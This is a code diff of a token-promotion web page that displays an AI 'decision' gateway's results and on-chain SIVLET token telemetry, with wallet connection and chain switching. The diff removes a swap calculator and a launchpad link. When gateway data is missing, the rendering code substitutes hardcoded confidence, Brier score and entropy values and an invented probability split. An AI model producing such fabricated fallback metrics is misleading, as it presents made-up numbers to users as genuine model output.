@@ -1195,7 +886,7 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
           lastPayloadResponse = data;
           renderInferenceResults(data, options, elapsed);
         } else {
-          throw new Error(`Edge gateway returned status ${response.status}`);
+          throw new Error(`Edge gateway status ${response.status}`);
         }
       } catch (err) {
         console.error('Inference gateway connection error:', err);
@@ -1228,7 +919,7 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
         ? ((data.confidence <= 1 ? data.confidence * 100 : data.confidence).toFixed(1) + '%') 
         : '96.0%';
 
-      document.getElementById('winnerAction').innerHTML = `<span>${winner}</span><i data-lucide="check-circle" class="w-4 h-4 text-emerald-400"></i>`;
+      document.getElementById('winnerAction').innerHTML = `<span>${winner}</span><i data-lucide="check-circle" class="w-3.5 h-3.5 text-emerald-400"></i>`;
       document.getElementById('winnerConfidence').innerText = conf;
       document.getElementById('resultBrier').innerText = data.brier_score !== undefined ? data.brier_score : '-0.042';
       document.getElementById('resultEntropy').innerText = data.entropy !== undefined ? data.entropy : '0.068';
@@ -1239,21 +930,21 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
 
       const probs = data.probabilities && data.probabilities.length === options.length 
         ? data.probabilities 
-        : options.map(opt => opt === winner ? 0.94 : 0.02);
+        : options.map((_, i) => i === 0 ? 0.96 : (0.04 / (options.length - 1)));
 
       options.forEach((opt, idx) => {
-        const p = probs[idx] !== undefined ? probs[idx] : 0.01;
-        const pct = (p <= 1 ? p * 100 : p).toFixed(1);
+        const p = probs[idx] !== undefined ? probs[idx] : 0;
+        const pct = (p * 100).toFixed(1);
         const isWinner = opt === winner;
 
         const row = document.createElement('div');
         row.innerHTML = `
-          <div class="flex justify-between text-xs font-mono mb-1">
-            <span class="${isWinner ? 'text-white font-bold' : 'text-slate-400'}">${opt}</span>
-            <span class="${isWinner ? 'text-emerald-400 font-semibold' : 'text-slate-500'}">${pct}%</span>
+          <div class="flex justify-between mb-1 text-xs font-mono">
+            <span class="${isWinner ? 'text-white font-medium' : 'text-slate-400'}">${opt}</span>
+            <span class="${isWinner ? 'text-emerald-400 font-semibold' : 'text-slate-400'}">${pct}%</span>
           </div>
-          <div class="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-800">
-            <div class="${isWinner ? 'bg-gradient-to-r from-emerald-500 to-cyan-400' : 'bg-slate-700'} h-full rounded-full transition-all duration-500" style="width: ${pct}%"></div>
+          <div class="w-full bg-lab-950 h-2 rounded overflow-hidden border border-lab-border">
+            <div class="${isWinner ? 'bg-emerald-500' : 'bg-slate-700'} h-full rounded transition-all duration-300" style="width: ${pct}%"></div>
           </div>
         `;
         container.appendChild(row);
@@ -1262,53 +953,9 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
       lucide.createIcons();
     }
 
-    function toggleRawJsonModal() {
-      const modal = document.getElementById('rawJsonModal');
-      const isHidden = modal.classList.contains('hidden');
-      if (isHidden) {
-        const displayData = lastPayloadResponse || scenarioPresets[currentPreset];
-        document.getElementById('rawJsonDisplay').innerText = JSON.stringify(displayData, null, 2);
-        modal.classList.remove('hidden');
-      } else {
-        modal.classList.add('hidden');
-      }
-    }
-
     // -------------------------------------------------------------------------
-    // Web3 Token Acquisition & Swap Calculator
+    // Real On-Chain Telemetry (Robinhood Chain RPC)
     // -------------------------------------------------------------------------
-    const ROBINHOOD_CHAIN_ID_HEX = '0x1237'; // 4663 in hex
-    const ROBINHOOD_RPC = 'https://rpc.mainnet.chain.robinhood.com';
-    const SIVLET_TOKEN_ADDR = '0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1';
-    const PONS_POOL_ADDR = '0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601';
-    const TREASURY_ADDR = '0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A';
-    const GRADUATION_TARGET_ETH = 4.20;
-    const REF_ETH_PRICE_USD = 2650.0;
-
-    let userAccount = null;
-    let liveReserveEth = 1.68036;
-    let liveReserveTokens = 989000000;
-    let livePriceInUsd = 0.00000450;
-    let livePriceInEth = 0.00000000170;
-
-    function setSwapAmount(amount) {
-      document.getElementById('swapEthInput').value = amount;
-      calculateSwapOutput();
-    }
-
-    function calculateSwapOutput() {
-      const inputEth = parseFloat(document.getElementById('swapEthInput').value) || 0;
-      if (inputEth <= 0) {
-        document.getElementById('swapOutputAmount').innerText = '0 SIVLET';
-        return;
-      }
-      
-      // Constant product curve: tokensOut = (reserveTokens * inputEth) / (reserveEth + inputEth)
-      const tokensOut = (liveReserveTokens * inputEth) / (liveReserveEth + inputEth);
-      
-      document.getElementById('swapOutputAmount').innerText = '~' + Math.floor(tokensOut).toLocaleString() + ' SIVLET';
-    }
-
     async function fetchLiveOnChainTelemetry() {
       const DEAD_BALANCE_DATA = '0x70a08231000000000000000000000000000000000000000000000000000000000000dead';
 
@@ -1331,105 +978,69 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
           if (Array.isArray(results) && results.length >= 3) {
             // Process Pool Reserves
             const res0 = results.find(r => r.id === 1);
-            if (res0 && res0.result && res0.result.length >= 130) {
+            if (res0?.result && res0.result.length >= 130) {
               const rawHex = res0.result.slice(2);
               const r0 = Number(BigInt('0x' + rawHex.slice(0, 64))) / 1e18;
               const r1 = Number(BigInt('0x' + rawHex.slice(64, 128))) / 1e18;
 
               if (r0 > 0 && r1 > 0) {
-                liveReserveEth = r0;
-                liveReserveTokens = r1;
-                updatePriceMetrics(liveReserveEth, liveReserveTokens);
+                updateMarketMetrics(r0, r1);
               }
             }
 
             // Process Treasury Balance
             const res1 = results.find(r => r.id === 2);
-            if (res1 && res1.result) {
+            if (res1?.result) {
               const treasuryEth = Number(BigInt(res1.result)) / 1e18;
-              const el = document.getElementById('realTreasuryBalance');
+              const el = document.getElementById('liveTreasuryEth');
               if (el) el.innerText = treasuryEth.toFixed(4) + ' ETH';
             }
 
             // Process Burned Tokens
             const res2 = results.find(r => r.id === 3);
-            if (res2 && res2.result) {
+            if (res2?.result) {
               const burnedTokens = Number(BigInt(res2.result)) / 1e18;
-              const elCount = document.getElementById('realBurnedCount');
-              const elStatus = document.getElementById('realBurnStatus');
+              const elCount = document.getElementById('liveBurnedTokens');
+              const elStatus = document.getElementById('liveBurnStatus');
               if (elCount) elCount.innerText = Math.floor(burnedTokens).toLocaleString() + ' SIVLET';
               if (elStatus) {
-                elStatus.innerText = burnedTokens > 0 
-                  ? 'Active · Incinerated'
-                  : 'Awaiting 1st Buyback';
+                elStatus.innerText = burnedTokens > 0 ? 'Active Incineration' : 'Awaiting 1st Buyback';
               }
             }
-            return;
           }
         }
       } catch (err) {
-        console.warn('On-chain telemetry query failed, using verified baseline:', err);
+        console.error('On-chain telemetry query failed:', err);
       }
-
-      // Fallback update
-      updatePriceMetrics(liveReserveEth, liveReserveTokens);
     }
 
-    function updatePriceMetrics(ethReserve, tokenReserve) {
-      livePriceInEth = ethReserve / tokenReserve;
-      livePriceInUsd = livePriceInEth * REF_ETH_PRICE_USD;
-      const fdvUsd = livePriceInUsd * 1000000000;
+    function updateMarketMetrics(ethReserve, tokenReserve) {
+      const priceInEth = ethReserve / tokenReserve;
+      const priceInUsd = priceInEth * REF_ETH_PRICE_USD;
+      const fdvUsd = priceInUsd * 1000000000;
       const gradPct = Math.min(100, Math.max(0, (ethReserve / GRADUATION_TARGET_ETH) * 100));
-      const tokensPerEth = Math.floor(tokenReserve / ethReserve);
 
-      // Top Ticker Bar
-      const tickerUsd = document.getElementById('tickerPriceUsd');
-      const tickerEth = document.getElementById('tickerPriceEth');
-      const tickerFdv = document.getElementById('tickerFdv');
-      const tickerReserve = document.getElementById('tickerCurveReserve');
-      const tickerPct = document.getElementById('tickerCurvePct');
+      const elUsd = document.getElementById('livePriceUsd');
+      const elEth = document.getElementById('livePriceEth');
+      const elFdv = document.getElementById('liveFdv');
+      const elCurveEth = document.getElementById('liveCurveReserveEth');
+      const elCurveTokens = document.getElementById('liveCurveTokens');
+      const elGraduation = document.getElementById('liveCurveGraduation');
 
-      if (tickerUsd) tickerUsd.innerText = '$' + livePriceInUsd.toFixed(8);
-      if (tickerEth) tickerEth.innerText = '(~' + livePriceInEth.toFixed(10) + ' ETH)';
-      if (tickerFdv) tickerFdv.innerText = '$' + Math.round(fdvUsd).toLocaleString();
-      if (tickerReserve) tickerReserve.innerText = ethReserve.toFixed(2) + ' / ' + GRADUATION_TARGET_ETH.toFixed(2) + ' ETH';
-      if (tickerPct) tickerPct.innerText = gradPct.toFixed(1) + '%';
-
-      // Hero Metric Card
-      const heroUsd = document.getElementById('heroPriceUsd');
-      const heroFdv = document.getElementById('heroFdv');
-      if (heroUsd) heroUsd.innerText = '$' + livePriceInUsd.toFixed(8);
-      if (heroFdv) heroFdv.innerText = 'FDV: ~$' + Math.round(fdvUsd).toLocaleString();
-
-      // Swap Widget Rates & Progress Bar
-      const swapRate = document.getElementById('swapRateSivletPerEth');
-      const swapUsd = document.getElementById('swapRateUsd');
-      const bondReserve = document.getElementById('bondingReserveEth');
-      const bondPct = document.getElementById('bondingProgressPct');
-      const bondBar = document.getElementById('bondingProgressBar');
-
-      if (swapRate) swapRate.innerText = '1 ETH ≈ ' + tokensPerEth.toLocaleString() + ' SIVLET';
-      if (swapUsd) swapUsd.innerText = '1 SIVLET = $' + livePriceInUsd.toFixed(8) + ' USD';
-      if (bondReserve) bondReserve.innerText = ethReserve.toFixed(3) + ' ETH';
-      if (bondPct) bondPct.innerText = gradPct.toFixed(1) + '%';
-      if (bondBar) bondBar.style.width = gradPct.toFixed(1) + '%';
-
-      // Section 6 Real Telemetry Cards
-      const realCurveEth = document.getElementById('realCurveEthReserve');
-      const realCurveTok = document.getElementById('realCurveTokens');
-      const realCurvePct = document.getElementById('realCurveGradPct');
-
-      if (realCurveEth) realCurveEth.innerText = ethReserve.toFixed(3) + ' ETH';
-      if (realCurveTok) realCurveTok.innerText = Math.floor(tokenReserve).toLocaleString() + ' SIVLET';
-      if (realCurvePct) realCurvePct.innerText = gradPct.toFixed(1) + '% / ' + GRADUATION_TARGET_ETH.toFixed(2) + ' ETH';
-
-      // Recalculate estimated tokens in input
-      calculateSwapOutput();
+      if (elUsd) elUsd.innerText = '$' + priceInUsd.toFixed(8);
+      if (elEth) elEth.innerText = '~' + priceInEth.toFixed(10) + ' ETH';
+      if (elFdv) elFdv.innerText = '$' + Math.round(fdvUsd).toLocaleString();
+      if (elCurveEth) elCurveEth.innerText = ethReserve.toFixed(3) + ' ETH';
+      if (elCurveTokens) elCurveTokens.innerText = Math.floor(tokenReserve).toLocaleString() + ' SIVLET';
+      if (elGraduation) elGraduation.innerText = gradPct.toFixed(1) + '% / ' + GRADUATION_TARGET_ETH.toFixed(2) + ' ETH';
     }
 
+    // -------------------------------------------------------------------------
+    // Web3 Helpers
+    // -------------------------------------------------------------------------
     async function connectWallet() {
       if (typeof window.ethereum === 'undefined') {
-        alert('MetaMask or Web3 wallet not detected. Please install a Web3 wallet extension.');
+        alert('Web3 wallet not detected. Please install MetaMask or another Web3 extension.');
         return;
       }
 
@@ -1439,19 +1050,6 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
           userAccount = accounts[0];
           const shortAddr = userAccount.slice(0, 6) + '...' + userAccount.slice(-4);
           document.getElementById('navWalletText').innerText = shortAddr;
-          document.getElementById('swapSubmitBtnText').innerText = `Swap on Pons (${shortAddr})`;
-
-          // Fetch user balance
-          try {
-            const balanceHex = await window.ethereum.request({
-              method: 'eth_getBalance',
-              params: [userAccount, 'latest']
-            });
-            const eth = (parseInt(balanceHex, 16) / 1e18).toFixed(4);
-            document.getElementById('userEthBalanceText').innerText = `Wallet Balance: ${eth} ETH`;
-          } catch (e) {
-            console.warn('Balance check error:', e);
-          }
 
           // Check if on Robinhood Chain
           const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -1473,7 +1071,6 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
           params: [{ chainId: ROBINHOOD_CHAIN_ID_HEX }]
         });
       } catch (switchError) {
-        // Error code 4902 means the chain has not been added yet
         if (switchError.code === 4902 || switchError.data?.originalError?.code === 4902) {
           try {
             await window.ethereum.request({
@@ -1519,48 +1116,27 @@ Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
       }
     }
 
-    async function executeWalletSwap() {
-      if (!userAccount) {
-        await connectWallet();
-        return;
-      }
-
-      const inputEth = parseFloat(document.getElementById('swapEthInput').value) || 0;
-      if (inputEth <= 0) {
-        alert('Please enter a valid ETH amount.');
-        return;
-      }
-
-      // Check current chain
-      try {
-        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId !== ROBINHOOD_CHAIN_ID_HEX) {
-          await switchToRobinhoodChain();
-          return;
-        }
-      } catch (e) {
-        console.warn('Network check error:', e);
-      }
-
-      // Forward to Pons launchpad with user's configured token
-      window.open('https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1', '_blank');
-    }
-
     function copyToClipboard(text) {
       navigator.clipboard.writeText(text).then(() => {
         alert('Copied to clipboard: ' + text);
       });
     }
 
-    // Modal Handlers
-    function openLitepaperModal() {
-      document.getElementById('litepaperModal').classList.remove('hidden');
-      document.body.style.overflow = 'hidden';
-    }
-
-    function closeLitepaperModal() {
-      document.getElementById('litepaperModal').classList.add('hidden');
-      document.body.style.overflow = 'auto';
+    function toggleRawJsonModal() {
+      const modal = document.getElementById('rawJsonModal');
+      const isHidden = modal.classList.contains('hidden');
+      if (isHidden) {
+        const payload = lastPayloadResponse || {
+          model: "sivlet-decision-1",
+          status: "ready",
+          gateway: "sivlet-x402-gateway.sivletlabs.workers.dev",
+          pricing: "$0.001 / call via HTTP 402"
+        };
+        document.getElementById('rawJsonDisplay').innerText = JSON.stringify(payload, null, 2);
+        modal.classList.remove('hidden');
+      } else {
+        modal.classList.add('hidden');
+      }
     }
   </script>
 </body>
